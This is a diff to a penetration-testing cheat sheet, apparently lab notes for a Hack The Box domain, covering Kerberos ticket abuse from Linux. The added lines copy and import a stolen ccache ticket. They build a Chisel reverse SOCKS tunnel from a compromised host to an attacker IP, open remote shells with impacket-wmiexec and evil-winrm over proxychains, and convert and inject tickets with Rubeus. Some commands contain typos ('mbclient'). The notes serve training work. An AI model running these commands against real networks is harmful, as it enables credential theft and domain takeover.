@@ -964,6 +964,7 @@ env | grep -i krb5
 ```
 ls -la /tmp
 ```
+#### Keytab
 ##### Abusing KeyTab Files
 ```
 klist -k -t 
@@ -995,8 +996,78 @@ ls -la /tmp
 ```
 id julio@inlanefreight.htb
 ```
+##### Importing the ccache file into our current session
+```
+klist
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+mbclient //dc01/C$ -k -c ls -no-pass
+```
 
+#### Using Linux Attack Tools with Kerberos
+##### Modify the Host file to hardcode IP Addresses of the Domain and Machines we want to attack.
+```
+# Host addresses
 
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
+```
+##### Proxychains Config File
+```
+
+<SNIP>
+
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+##### Doanload Chisel to the Attack Host
+```
+./chisel server --reverse 
+```
+##### Execute Chisel from MS01
+```
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+```
+##### Setting the KRB5CCNAME Environment Variable
+```
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+```
+##### Use impacket eith proxychains and kerberos authentication
+```
+proxychains impacket-wmiexec dc01 -k
+```
+##### Kerberos Configuration of /etc/krb5.conf
+```
+
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+
+<SNIP>
+```
+##### Use Evil-WinRM with Kerberos
+```
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+#### Miscellaneous
+##### Impacket Ticket Converter
+```
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+##### Importing Converted Ticket into Windows Session with Rubeus
+```
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+
+#### Linikatz
 
 ## Cracking Files
 ### Protected Files
